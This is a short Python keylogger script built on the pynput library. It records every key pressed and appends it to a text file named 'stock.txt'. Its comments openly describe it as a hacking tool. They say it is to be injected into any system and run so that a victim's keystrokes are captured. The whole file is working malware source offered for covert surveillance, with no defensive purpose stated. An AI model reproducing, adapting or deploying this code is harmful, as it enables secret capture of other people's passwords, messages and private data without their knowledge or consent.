from pynput.keyboard import Listener
#This is a keylogger programme with help of this we can gain keyboard movement in specific file (txt file) 
#it is most use full in hackig technique 
#first inject in any system and just run that python code and a Victom's all keybord movement can capture in text file ..BOOM
def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'","")

    if keydata == 'Key.space':
        keydata = ' '
    
    if keydata == 'Key.shift_r':
        keydata = ''
    
    if keydata == 'Key.shift':
        keydata = ''
    
    if keydata == 'Key.ctrl_l':
        keydata = ''
    
    if keydata == 'Key.enter':
        keydata = '\n'
    
    if keydata == 'Key.backspace':
        keydata = ''
    
    with open("stock.txt",'a') as f:
        f.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()


